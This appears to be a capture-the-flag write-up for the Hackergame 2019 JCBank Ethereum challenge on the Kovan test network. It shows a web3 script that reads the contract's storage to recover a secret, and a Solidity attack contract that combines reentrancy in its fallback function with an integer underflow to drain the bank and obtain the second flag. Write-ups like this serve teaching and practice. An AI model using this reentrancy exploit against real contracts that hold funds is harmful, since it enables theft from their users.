## Hackergame2019 JCBank

* 以太坊 `Kovan` 测试链
* 合约地址：[https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51](https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51)
* 题目：[https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment](https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment)

### Analysis

* 两个 `flag` :
    * `get_flag_1`
    * `get_flag_2`

* `get_flag_1` 读取 `storage` 变量 `secret` 的值即可，其位于 `slot 0` 的位置，其值为 `0x175bddc0da1bd47369c47861f48c8ac` ，调用 `get_flag_1` 即可

```javascript
var Web3=require("web3");
if (typeof web3 !== 'undefined') {
    web3 = new Web3(web3.currentProvider);
} else {
    web3 = new Web3(new Web3.providers.HttpProvider("https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1"));
}

var address="0xE575c9abD35Fa94F1949f7d559056bB66FddEB51";
web3.eth.getStorageAt(address, 0, function(x,y){console.info(y)});
web3.eth.getStorageAt(address, 1, function(x,y){console.info(y)});
web3.eth.getStorageAt(address, 2, function(x,y){console.info(y)});
```

* `get_flag_2` 利用 <span id="inline-blue">Reentrancy</span> 和 <span id="inline-yellow">整型下溢</span>

```javascript
contract hack {
    address instance_address = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;
    JCBank target = JCBank(instance_address);
    uint public have_withdraw = 0;
    string public s;
    
    constructor() public payable {}
    
    function attack() public {
        target.deposit.value(0.1 ether)();
    }
    
    function attack1(uint128 guess) public {
        s=target.get_flag_1(guess);
    }
    
    function attack2() public {
        if(have_withdraw == 1){
            target.get_flag_2(155418233698);
        }
    }

    function attack3() public {
        target.withdraw(0.1 ether);
    }

    function() payable {
        if (have_withdraw == 0 && msg.sender == instance_address){
            have_withdraw = 1;
            target.withdraw(0.1 ether);
        }
    }
}
```

* `attack` 存入一点金额，`attack3` 重入攻击两次， `attack2` 调用 `get_flag_2` 即可
